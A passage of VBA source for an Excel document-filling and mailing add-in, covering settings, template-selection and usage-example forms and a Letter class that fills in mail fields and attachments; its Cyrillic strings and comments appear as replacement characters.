    AttachFolder$ = CreateObject("WScript.Shell").SpecialFolders("mydocuments") & "\"        '|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\"
    InitialPath$ = IIf(Me.TextBox_Mail_AttachStaticFolder <> "" And Not Me.TextBox_Mail_AttachStaticFolder Like "{*}", Me.TextBox_Mail_AttachStaticFolder, AttachFolder$)
    Folder$ = GetFolderPath("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", InitialPath$)
    If Folder$ = "" Then Exit Sub
    Me.TextBox_Mail_AttachStaticFolder = Folder$
    Me.TextBox_Mail_AttachStaticFolder.ForeColor = vbBlack
End Sub

Private Sub CommandButton_Change_TheBAT_Path_Click()
    On Error Resume Next: Err.Clear
    New_TheBAT_Path$ = GetFilePath("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| TheBAT!", TheBAT_PATH, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| TheBAT!", "*.exe")
    If New_TheBAT_Path$ = "" Then Exit Sub
    Me.TextBox_TheBAT_Path = New_TheBAT_Path$
End Sub

Private Sub CommandButton_ChangeImagesFolder_Click()
    On Error Resume Next
    InitialPath$ = IIf(IMAGES_FOLDER$ <> "", IMAGES_FOLDER$, ThisWorkbook.Path)
    Folder$ = GetFolderPath("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", InitialPath$)
    If Folder$ = "" Then Exit Sub
    Me.TextBox_ImagesFolder = Folder$
End Sub

Private Sub CommandButton_ChangeLogFilename_Click()
    On Error Resume Next
    InitialPath$ = Me.TextBox_LogFilename
    filename$ = FWF.GetFilePath("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|", InitialPath$)
    If filename$ = "" Then Exit Sub
    Me.TextBox_LogFilename = filename$
End Sub

Private Sub CommandButton_ChangeWordDocFolder_Click()
    On Error Resume Next
    InitialPath$ = IIf(WORDDOC_FOLDER$ <> "", WORDDOC_FOLDER$, ThisWorkbook.Path)
    Folder$ = GetFolderPath("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Word |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", InitialPath$)
    If Folder$ = "" Then Exit Sub
    Me.TextBox_WordDocFolder = Folder$
End Sub

Private Sub CommandButton_Quit_Click()
    Unload Me
End Sub

Private Sub CommandButton_ResetAllSettings_Click()
    On Error Resume Next
    If MsgBox(tt("ResetAllSettings_MessageText"), vbQuestion + vbOKCancel + vbDefaultButton2, tt("ResetAllSettings_MessageTitle")) = vbCancel Then Exit Sub
    DeleteSetting PROJECT_NAME$, "Settings"
    SaveDefaultSettings

    RunWithDelay "ShowSettingsPage", 0.3
    Unload Me
End Sub

Private Sub CommandButton_Unisender_Connect_Click()
    On Error Resume Next
    res = Unisender_getLists(Trim(Me.TextBox_EmailAPI_APIkey))
    old_ListID$ = SETT.GetText("ComboBox_EmailAPI_ListID")

    If IsArray(res) Then
        Me.CheckBox_UnisenderFrame.value = True

        With Me.ComboBox_EmailAPI_ListID
            .list = res
            .ListIndex = -1

            For i = 1 To UBound(res)
                If Len(old_ListID$) Then
                    If res(i) = old_ListID$ Then Me.ComboBox_EmailAPI_ListID.ListIndex = i - 1                           '.Value = res(i)
                End If
            Next
            If .ListIndex = -1 Then
                For i = 1 To UBound(res)
                    If res(i) Like "*|FillDocuments" Then Me.ComboBox_EmailAPI_ListID.ListIndex = i - 1                               '.Value = res(i)
                Next
            End If
            If .ListIndex = -1 Then Me.ComboBox_EmailAPI_ListID.ListIndex = 0
        End With

        'MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & UBound(res), vbInformation, "ok"
    Else
        Me.CheckBox_UnisenderFrame.value = False
        MsgBox res, vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd|"
    End If
End Sub

Private Sub Image_ExportSettings_Click()
    ExportSettings
End Sub
Private Sub Image_ImportSettings_Click()
    If Not ImportSettings Then Exit Sub
    RunWithDelay "ShowSettingsPage", 0.3
    Unload Me
End Sub

Private Sub Label_Help_FieldCodes_Click()
    On Error Resume Next
    URL$ = DEVELOPER_WEBSITE$ & "programmes/" & PROJECT_NAME$ & "/FieldCodes?ref=" & HID$
    CreateObject("wscript.Shell").Run URL$
End Sub

Private Sub Label_Help_FilenamesMask_Click()
    On Error Resume Next
    URL$ = DEVELOPER_WEBSITE$ & "programmes/" & PROJECT_NAME$ & "/FilenamesMask?ref=" & HID$
    CreateObject("wscript.Shell").Run URL$
End Sub

Private Sub Label_Help_InsertFormulasForSeparateLetters_Click()
    On Error Resume Next
    URL$ = DEVELOPER_WEBSITE$ & "programmes/" & PROJECT_NAME$ & "/SeparateLetters?ref=" & HID$
    CreateObject("wscript.Shell").Run URL$
End Sub

Private Sub Label_Help_InsertImages_Click()
    On Error Resume Next
    URL$ = DEVELOPER_WEBSITE$ & "programmes/" & PROJECT_NAME$ & "/InsertImages?ref=" & HID$
    CreateObject("wscript.Shell").Run URL$
End Sub

Private Sub Label_Help_InsertTables_Click()
    On Error Resume Next
    URL$ = DEVELOPER_WEBSITE$ & "programmes/" & PROJECT_NAME$ & "/InsertTables?ref=" & HID$
    CreateObject("wscript.Shell").Run URL$
End Sub

Private Sub Label_help_mail_Click()
    FWF.FollowHyperlink "https://excelvba.ru/programmes/FillDocuments/manuals/mailing"
End Sub

Private Sub Label_help1_Click()
    FWF.FollowHyperlink "https://excelvba.ru/programmes/FillDocuments/manuals/mailing/TheBAT"
End Sub
Private Sub Label_help2_Click()
    FWF.FollowHyperlink "https://excelvba.ru/programmes/FillDocuments/manuals/mailing/setup"
End Sub
Private Sub Label_help3_Click()
    FWF.FollowHyperlink "https://excelvba.ru/programmes/FillDocuments/manuals/mailing/Unisender"
End Sub
Private Sub Label_help4_Click()
    FWF.FollowHyperlink "https://excelvba.ru/programmes/FillDocuments/manuals/mailing/html_mail"
End Sub
Private Sub Label_help5_Click()
    FWF.FollowHyperlink "https://excelvba.ru/programmes/FillDocuments/manuals/mailing/Outlook"
End Sub

Private Sub Label_HelpMultiRow_Click()
    On Error Resume Next
    URL$ = DEVELOPER_WEBSITE$ & "programmes/" & PROJECT_NAME$ & "/MultiRow"
    CreateObject("wscript.Shell").Run URL$
End Sub

Private Sub Label_HelpMultiRowGroup_Click()
    On Error Resume Next
    URL$ = DEVELOPER_WEBSITE$ & "programmes/" & PROJECT_NAME$ & "/MultiRow/Group"
    CreateObject("wscript.Shell").Run URL$
End Sub

Private Sub Label_OpenImagesFolder_Click()
    OpenFolder IMAGES_FOLDER$
End Sub

Private Sub Label_OpenLogFile_Click()
    On Error Resume Next
    filename$ = Me.TextBox_LogFilename
    If Dir(filename$, vbNormal) = "" Then
        MsgBox "|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical
    Else
        Workbooks.Open filename$, Local:=True
    End If
End Sub

Private Sub Label_OpenWordDocFolder_Click()
    OpenFolder WORDDOC_FOLDER$
End Sub

Private Sub Label_SaveAsPDF_Click()
    On Error Resume Next
    URL$ = DEVELOPER_WEBSITE$ & "faq/SaveAsPDF?ref=" & HID$
    CreateObject("wscript.Shell").Run URL$
End Sub

Private Sub Label_SendEmail_Click()
    On Error Resume Next: Err.Clear
    Me.MultiPage_Options.value = Me.MultiPage_Options.Pages("Page_SendMail").Index
End Sub


Private Sub Label_Unisender_Click()
    FWF.FollowHyperlink "http://www.unisender.com/?a=FillDocuments"
End Sub

Private Sub Label_Unisender2_Click()
    FWF.FollowHyperlink "http://www.unisender.com/?a=FillDocuments"
End Sub

'Private Sub TextBox_SendInterval_Max_Change()
'    On Error Resume Next
'    v& = Val(Trim(Me.TextBox_SendInterval_Max))
'    If Me.TextBox_SendInterval_Max <> CStr(v) Then Me.TextBox_SendInterval_Max = CStr(v)
'    'If Val(Trim(Me.TextBox_SendInterval_Min)) > v Then Me.TextBox_SendInterval_Min = CStr(v)
'End Sub
'
'Private Sub TextBox_SendInterval_Min_Change()
'    On Error Resume Next
'    v& = Val(Trim(Me.TextBox_SendInterval_Min))
'    If Me.TextBox_SendInterval_Min <> CStr(v) Then Me.TextBox_SendInterval_Min = CStr(v)
'    'If Val(Trim(Me.TextBox_SendInterval_Max)) < v Then Me.TextBox_SendInterval_Max = CStr(v)
'End Sub


Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    On Error Resume Next
    Set Me.SpecialControlsCollection = Nothing
End Sub

Private Sub UserForm_Initialize()
    On Error Resume Next
    Set ThisWorkbook.app = Application
    For i = 1 To 256
        Me.ComboBox_BaseColumn.AddItem ColumnNameByColumnNumber(i)
        Me.ComboBox_Multirow_GroupColumn.AddItem ColumnNameByColumnNumber(i)
        Me.ComboBox_SendMark_Column.AddItem ColumnNameByColumnNumber(i)
        Me.ComboBox_SendTime_Column.AddItem ColumnNameByColumnNumber(i)
        Me.ComboBox_TemplatesFilter_Column.AddItem ColumnNameByColumnNumber(i)
    Next
    For i = 1 To 50: Me.ComboBox_FirstRow.AddItem i: Next i

    Me.ComboBox_TheBAT_Account.Clear
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| TheBAT!
    Err.Clear
    With CreateObject("WScript.Shell")
        For i = 1 To 100
            key$ = "HKEY_CURRENT_USER\Software\RIT\The Bat!\Users depot\User #" & i
            Err.Clear: mailBox$ = .RegRead(key$)
            If Err = 0 Then Me.ComboBox_TheBAT_Account.AddItem mailBox$
        Next
        key$ = "HKEY_CURRENT_USER\Software\RIT\The Bat!\Users depot\Default"
        DefaultAccount$ = .RegRead(key$)
        If Len(DefaultAccount$) Then Me.ComboBox_TheBAT_Account = DefaultAccount$
    End With


    ' special controls
    Set Me.SpecialControlsCollection = New Collection
    For Each ctrl In Me.Controls
        If TypeName(ctrl) = "ScrollBar" And ctrl.Tag = "ScrollCombo" Then
            Set SC = New SpecialControl: Set SC.Scroller = ctrl
            If SC.FieldFound Then Me.SpecialControlsCollection.Add SC
        End If
    Next
    Set SC = New SpecialControl: Set SC.MainCheckboxInFrame = Me.CheckBox_CombineXLSsheets: Me.SpecialControlsCollection.Add SC
    Set SC = New SpecialControl: Set SC.MainCheckboxInFrame = Me.CheckBox_UnisenderFrame: Me.SpecialControlsCollection.Add SC


    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    Me.TextBox_TheBAT_Path = TheBAT_PATH

    'Me.CheckBox_UseCurrentFolder = USE_CURRENT_FOLDER

    Me.ComboBox_LineFeed.list = LineFeedOptions
    Me.MultiPage_SendMode.value = 0

    'Me.CheckBox_PDF.Enabled = Val(Application.Version) > 11

    SETT.LoadIntoSettingForm Me
    TranslateUserForm Me

    '    Me.TextBox_TemplatesFolder = TEMPLATES_FOLDER$(True)
    '    Me.TextBox_OutputFolder = OUTPUT_FOLDER$(True)

    Me.MultiPage_Options.value = 0
    Me.MultiPage_Options.Pages("Page_AdditionalOptions").ScrollTop = 0
    Me.MultiPage_Options.Pages("Page_SendMail").ScrollTop = 0
    Me.MultiPage_SendMode.Pages("Page_API").ScrollTop = 0

    Me.MultiPage_Options.Pages("Page_SendMail").Visible = Me.CheckBox_SendEmail
    Me.CheckBox_UnisenderFrame.value = False

    ' translation fix
    For Each ctrl In Me.Controls
        If TypeName(ctrl) = "MultiPage" Then
            'ctrl.Value = 0 ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd|.|fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            For Each m_page In ctrl.Pages
                m_page.ScrollTop = 0
                m_page.Caption = " " & m_page.Caption & " "
            Next
        End If
    Next
End Sub



Private Sub CommandButton_SaveSettings_Click()
    On Error Resume Next
    Dim RebuildMenu As Boolean
    If SETT.GetBoolean("CheckBox_ShowAdditionalMenu") <> Me.CheckBox_ShowAdditionalMenu Then RebuildMenu = True
    SETT.SaveAllFromSettingForm Me

    If RebuildMenu Then UpdateAddinToolbar
    Enable_HotKeys
    Set ThisWorkbook.app = Application
    Unload Me
End Sub

Private Sub CheckBox_UseCurrentFolder_Click()
    On Error Resume Next
    SETT.SetText "CheckBox_UseCurrentFolder", Me.CheckBox_UseCurrentFolder
    UpdateFoldersFieldsAndButtons
End Sub

Sub UpdateFoldersFieldsAndButtons()
    On Error Resume Next
    Me.TextBox_TemplatesFolder = TEMPLATES_FOLDER$(True)
    Me.TextBox_OutputFolder = OUTPUT_FOLDER$(True)
    Dim UseCurrentFolder As Boolean: UseCurrentFolder = USE_CURRENT_FOLDER
    Me.CheckBox_UseCurrentFolder.Font.Bold = USE_CURRENT_FOLDER

    Me.CommandButton_ChangeOutputFolder.Enabled = Not UseCurrentFolder
    Me.CommandButton_ChangeTemplatesFolder.Enabled = Not UseCurrentFolder

    Me.TextBox_OutputFolder.Enabled = Not UseCurrentFolder
    Me.TextBox_TemplatesFolder.Enabled = Not UseCurrentFolder
End Sub

Private Sub CommandButton_ChangeOutputFolder_Click()
    On Error Resume Next
    InitialPath$ = IIf(FWF.FolderExists(OUTPUT_FOLDER$), OUTPUT_FOLDER$, ThisWorkbook.Path)
    Folder$ = GetFolderPath("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", InitialPath$)
    If Folder$ = "" Then Exit Sub
    Me.TextBox_OutputFolder = Folder$
End Sub

Private Sub CommandButton_ChangeTemplatesFolder_Click()
    On Error Resume Next
    InitialPath$ = IIf(FWF.FolderExists(TEMPLATES_FOLDER$), TEMPLATES_FOLDER$, ThisWorkbook.Path)
    Folder$ = GetFolderPath("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", InitialPath$)
    If Folder$ = "" Then Exit Sub
    Me.TextBox_TemplatesFolder = Folder$
End Sub

Private Sub Label_OpenTemplatesFolder_Click()
    On Error Resume Next: OpenFolder TEMPLATES_FOLDER$
End Sub
Private Sub Label_OpenOutputFolder_Click()
    On Error Resume Next: OpenFolder OUTPUT_FOLDER$
End Sub


Attribute VB_Name = "F_Templates"
Attribute VB_Base = "0{250FC5CC-069A-4579-AD04-A0F3FB4CFBB8}{E0A171C6-78AA-469E-960C-63712272F677}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Form      : F_Templates
' Author        : EducatedFool                     Date: 16.01.2013
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/         Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Compare Text

Private Sub CommandButton_Cancel_Click()
    On Error Resume Next: Err.Clear
    Unload Me
End Sub

Sub CommandButton_InvertSelection_Click()
    On Error Resume Next: Err.Clear
    For i = 0 To Me.ListBox_Templates.ListCount - 1
        Me.ListBox_Templates.Selected(i) = Not Me.ListBox_Templates.Selected(i)
    Next i
    Me.ListBox_Templates.SetFocus
End Sub

Private Sub CommandButton_OpenTemplatesFolder_Click()
    On Error Resume Next
    FolderPath$ = TEMPLATES_FOLDER$
    If CreateObject("Scripting.FileSystemObject").FolderExists(FolderPath$) Then
        CreateObject("wscript.shell").Run "explorer.exe /e,/root, """ & FolderPath$ & """"
    Else
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|" & vbNewLine & IIf(FolderPath$ = "", "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", FolderPath$), _
               vbExclamation, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End If
End Sub

Private Sub CommandButton_Run_Click()
    On Error Resume Next: Err.Clear
    SelectedTemplatesList$ = "|"
    For i = 0 To Me.ListBox_Templates.ListCount - 1
        If Me.ListBox_Templates.Selected(i) = True Then
            SelectedTemplatesList$ = SelectedTemplatesList$ & Me.ListBox_Templates.list(i, 2) & "|"
            SelectedTemplates.Add Me.ListBox_Templates.list(i, 0)
        End If
    Next i
    SETT.SetText "SelectedTemplatesList", SelectedTemplatesList$
    Unload Me
End Sub

Sub CommandButton_SelectAll_Click()
    On Error Resume Next: Err.Clear
    For i = 0 To Me.ListBox_Templates.ListCount - 1
        Me.ListBox_Templates.Selected(i) = True
    Next i
End Sub

Sub CommandButton_UnselectAll_Click()
    On Error Resume Next: Err.Clear
    For i = 0 To Me.ListBox_Templates.ListCount - 1
        Me.ListBox_Templates.Selected(i) = False
    Next i
End Sub

Private Sub ListBox_Templates_Change()
    On Error Resume Next: Err.Clear
    Dim nALL&, nSEL&
    nALL& = Me.ListBox_Templates.ListCount
    For i = 0 To nALL& - 1
        nSEL& = nSEL& - Me.ListBox_Templates.Selected(i)
    Next i

    Me.CommandButton_Run.Enabled = nSEL& > 0
    If Me.Label_Info.Tag <> "" Then Exit Sub
    Me.Label_Info = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & nALL& & ", |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & nSEL&
    If SETT.GetBoolean("CheckBox_MultiRow") = False Then
        If nSEL& Then Me.Label_Info = Me.Label_Info & ".  |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & SelectedRowsCount& * nSEL&
    End If
End Sub

Sub SpinButton_FormWidth_Change()
    SETT.SetText "SpinButton_FormWidth", Me.SpinButton_FormWidth.value
    SetTemplatesFormWidth
End Sub

Sub SetTemplatesFormWidth()
    On Error Resume Next
    k& = SETT.GetNumber("SpinButton_FormWidth", 0)
    Const FormW& = 560, ListboxW& = 520, StepW& = 20
    Me.Width = FormW& + StepW& * k&
    Me.ListBox_Templates.Width = ListboxW& + StepW& * k&
End Sub

Private Sub UserForm_Initialize()
    On Error Resume Next: Err.Clear
    '|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' If SelectedTemplates Is Nothing Then Set SelectedTemplates = FWF.FilenamesCollection(TEMPLATES_FOLDER$)
    Me.SpinButton_FormWidth.value = SETT.GetNumber("SpinButton_FormWidth", 0)
    SetTemplatesFormWidth

    SelectedTemplatesList$ = SETT.GetText("SelectedTemplatesList", "")

    Tfolder$ = TEMPLATES_FOLDER$
    ReDim arr(1 To SelectedTemplates.Count, 1 To 5)
    For i& = 1 To SelectedTemplates.Count
        arr(i, 1) = SelectedTemplates(i)
        arr(i, 2) = i
        arr(i, 3) = Dir(arr(i, 1))
        arr(i, 4) = TemplateTypeForListbox(arr(i, 1))
        subfolder$ = Replace(arr(i, 1), Tfolder$, "")
        arr(i, 5) = Left(subfolder$, InStrRev(subfolder$, "\") - 1)
    Next

    If SETT.GetBoolean("CheckBox_TemplatesForm_SortByName") Then CoolSort arr, 3

    Me.ListBox_Templates.list = arr
    Set SelectedTemplates = New Collection

    If Len(SelectedTemplatesList$) <= 1 Then
        CommandButton_SelectAll_Click
    Else
        For i = 0 To Me.ListBox_Templates.ListCount - 1
            Me.ListBox_Templates.Selected(i) = SelectedTemplatesList$ Like "*|" & Me.ListBox_Templates.list(i, 2) & "|*"
        Next i
    End If
End Sub

Function CoolSort(SourceArr As Variant, ByVal n As Integer) As Variant
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| N
    If n > UBound(SourceArr, 2) Or n < LBound(SourceArr, 2) Then Exit Function
    Dim Check As Boolean, iCount As Integer, jCount As Integer, nCount As Integer
    ReDim tmpArr(UBound(SourceArr, 2)) As Variant
    Do Until Check
        Check = True
        For iCount = LBound(SourceArr, 1) To UBound(SourceArr, 1) - 1
            If SourceArr(iCount, n) > SourceArr(iCount + 1, n) Then
                For jCount = LBound(SourceArr, 2) To UBound(SourceArr, 2)
                    tmpArr(jCount) = SourceArr(iCount, jCount)
                    SourceArr(iCount, jCount) = SourceArr(iCount + 1, jCount)
                    SourceArr(iCount + 1, jCount) = tmpArr(jCount)
                    Check = False
                Next
            End If
        Next
    Loop
    CoolSort = SourceArr
End Function

Attribute VB_Name = "F_UsageExample"
Attribute VB_Base = "0{2D002657-63CF-4EE9-86B1-9E09960ED4C5}{B41E4FD2-1A7F-4EC4-80A2-D743B33F01E9}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : F_UsageExample                    Version:
' Author        : Igor Vakhnenko                   Date: 22.09.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text: Option Explicit
Public SettingsBackupFile$

Private Sub CommandButton_Done_Click()
    Unload Me
End Sub

Private Sub CommandButton_OpenOutputFolder_Click()
    On Error Resume Next
    FWF.OpenFolder OUTPUT_FOLDER$
    Me.Show
End Sub

Private Sub CommandButton_OpenSourceWorkbook_Click()
    On Error Resume Next: Dim res As Boolean
    res = DownloadAndOpenExcelTable(1)
    Me.CommandButton_Test_DownloadTemplates.Enabled = res
    Me.Show
End Sub

Private Sub CommandButton_TestInsertPicturesFromFolder_Click()
    On Error Resume Next: Dim res As Boolean
    res = UsageExampleMacro1
    Me.CommandButton_GotoUsageExample.Enabled = True
    Me.Show
End Sub

Private Sub CommandButton_GotoUsageExample_Click()
    Me.MultiPage1.value = 1
End Sub

Private Sub CommandButton_Test_DownloadTemplates_Click()
    On Error Resume Next: Dim res As Boolean
    res = DownloadTemplatesFromWebsite
    Me.CommandButton_Test_CreateDocuments.Enabled = True
    Me.Show
End Sub

Private Sub CommandButton_Test_CreateDocuments_Click()
    On Error Resume Next: Dim res As Boolean
    res = UsageExampleMacro1
    Me.CommandButton_OpenOutputFolder.Enabled = True
    Me.Show
End Sub

Private Sub Label_OpenTemplatesFolder_Click()
    On Error Resume Next: OpenFolder TEMPLATES_FOLDER$
End Sub
Private Sub Label_OpenOutputFolder_Click()
    On Error Resume Next: OpenFolder OUTPUT_FOLDER$
End Sub

Private Sub UserForm_Initialize()
    On Error Resume Next
    TranslateUserForm Me
    Me.MultiPage1.value = 0
    Me.SettingsBackupFile = SETT.Reset        ' backup current settings

    Dim ctrl As Object, m_page As Object  ' translation fix
    For Each ctrl In Me.Controls
        If TypeName(ctrl) = "MultiPage" Then
            ctrl.value = 0
            For Each m_page In ctrl.Pages
                m_page.ScrollTop = 0
                m_page.Caption = " " & m_page.Caption & " "
            Next
        End If
    Next

    Me.TextBox_TemplatesFolder = TEMPLATES_FOLDER$
    Me.TextBox_OutputFolder = OUTPUT_FOLDER$
End Sub

Private Sub UserForm_Terminate()
    SETT.ImportFromFile Me.SettingsBackupFile, True        ' restore settings
End Sub
Attribute VB_Name = "Letter"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Option Compare Text

Public Subject As String
Public Body As String
Public Email As String
Public CC As String
Public BCC As String

Public Attachments As New Collection

Public SourceRow As Range

Public UniqueNumber As String        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|

Sub AddSendMark()
    On Error Resume Next: Dim col&
    If SETT.GetBoolean("CheckBox_AddSendMarkIntoRow") Then
        col& = 0: col& = SETT.GetNumber("ComboBox_SendMark_Column")
        If col Then
            If Email Like "*?@?*.?*" Then Me.SourceRow.EntireRow.Columns(col).value = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        End If
    End If
    
    If SETT.GetBoolean("CheckBox_AddSendTimeIntoRow") Then
        col& = 0: col& = SETT.GetNumber("ComboBox_SendTime_Column")
        If col Then
            If Email Like "*?@?*.?*" Then Me.SourceRow.EntireRow.Columns(col).value = Now
        End If
    End If
End Sub

Sub Render(ByRef options As Dictionary)
    On Error Resume Next: Err.Clear
    Mask$ = SETT.GetText("TextBox_AttachStaticFilesMask", "")
    If Mask$ = "" Then Mask$ = "*"

    Static_attach_folder$ = SETT.GetText("TextBox_Mail_AttachStaticFolder", "")

    arr = options.Keys
    For i = LBound(arr) To UBound(arr)
        key$ = arr(i)
        txt$ = options(arr(i))
        Subject = Replace(Subject, key$, txt$, , , vbTextCompare)
        Body = Replace(Body, key$, txt$, , , vbTextCompare)
        Email = Replace(Email, key$, txt$, , , vbTextCompare)
        CC = Replace(CC, key$, txt$, , , vbTextCompare)
        BCC = Replace(BCC, key$, txt$, , , vbTextCompare)
        Mask$ = Replace(Mask$, key$, txt$, , , vbTextCompare)
        Static_attach_folder$ = Replace(Static_attach_folder$, key$, txt$, , , vbTextCompare)
    Next i
    Email = Trim(Application.Trim(Application.Clean(Replace(Replace(Email, Chr(160), " "), """", "`"))))
    CC = Trim(Application.Trim(Application.Clean(Replace(Replace(CC, Chr(160), " "), """", "`"))))
    BCC = Trim(Application.Trim(Application.Clean(Replace(Replace(BCC, Chr(160), " "), """", "`"))))
    Subject = Application.Clean(Subject)

    If SETT.GetBoolean("CheckBox_Mail_AttachStaticFiles") Then
        If (Len(Static_attach_folder$) > 2) And CreateObject("Scripting.FileSystemObject").FolderExists(Static_attach_folder$) Then
            Me.AttachAllStaticFiles Static_attach_folder$, Mask$
        End If
    End If

End Sub

Sub AddAttachment(ByVal filename$, Optional ByVal FileMask$)
    On Error Resume Next: Err.Clear
    FileMask$ = Trim(FileMask$)
    If Left(FileMask$, 1) <> "*" Then FileMask$ = "*" & FileMask$
    If filename$ Like FileMask$ Then Attachments.Add filename$
End Sub

Sub AttachAllStaticFiles(ByVal Static_attach_folder$, ByVal Mask$)
    On Error Resume Next: Err.Clear
    Dim coll As Collection, m As Variant
    For Each m In Split(Mask$, "|")
        If Len(m) Then
            Set coll = Nothing: Set coll = FWF.FilenamesCollection(Static_attach_folder$, m, 1)
            For Each item In coll
